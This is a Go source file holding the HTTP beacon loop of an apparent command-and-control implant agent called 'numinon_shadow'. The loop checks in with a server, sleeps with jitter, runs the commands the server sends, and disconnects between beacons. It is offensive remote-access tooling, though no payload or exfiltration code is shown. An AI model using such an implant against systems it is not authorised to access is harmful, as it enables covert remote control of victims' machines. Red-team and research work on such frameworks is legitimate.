package agent

import (
	"encoding/json"
	"fmt"
	"log"
	"numinon_shadow/internal/models"
	"time"
)

// runHttpLoop handles the main check-in cycle for HTTP-based protocols using time.Sleep and jitter.
func (a *Agent) runHttpLoop() error {
	log.Println("|AGENT LOOP HTTP|-> HTTP loop started.")

	for {
		// Check for stop signal at the beginning of each iteration (non-blocking)
		select {
		// This will come from our Stop() function
		case <-a.stopChan:
			log.Println("|AGENT LOOP HTTP|-> Stop signal received, exiting HTTP loop.")
			return nil
		default:
			sleepDuration := a.calculateSleepWithJitter()

			// PERFORM CHECK-IN
			log.Println("|AGENT LOOP HTTP|-> Performing check-in...")

			responseBytes, err := a.communicator.CheckIn()
			if err != nil {
				log.Printf("|❗ERR AGENT LOOP HTTP| CheckIn failed: %v", err)
				// Error during check-in, proceed to sleep and retry next iteration
				time.Sleep(sleepDuration)
				continue
			}

			// PROCESS CHECKIN
			// First, unmarshall Response Body

			var taskResp models.ServerTaskResponse

			err = json.Unmarshal(responseBytes, &taskResp)
			if err != nil {
				log.Println("Failed to unmarshal response body from HTTP request")
				time.Sleep(sleepDuration)
				continue
			}

			// Next, check if there is no task
			if !taskResp.TaskAvailable {
				log.Println("|AGENT LOOP HTTP|-> No task from server, going back to sleep.")

			}

			// Getting here implies there is a task, still not an issue to check explicitly (for readability)

			if taskResp.TaskAvailable {
				log.Println("|AGENT LOOP HTTP|-> Task is available.")
				log.Printf("|AGENT LOOP HTTP|-> Task received (ID: %s, Cmd: %s). Executing...", taskResp.TaskID, taskResp.Command)
				a.executeTask(taskResp) // Execute the task (which will send results internally)
			}

			// RIGHT BEFORE WE SLEEP WE DISCONNECT
			if a.config.BeaconMode {
				log.Println("|AGENT LOOP HTTP|-> Beacon Mode is ENABLED, calling Disconnect()")
				err := a.communicator.Disconnect()
				if err != nil {
					fmt.Println("|AGENT LOOP HTTP|-> Beacon Mode failed to called Disconnect")
				}

			}
			// ENDS HERE
			
			log.Printf("|AGENT LOOP HTTP|-> Sleeping for %v...", sleepDuration)
			time.Sleep(sleepDuration)
		}
	}
}
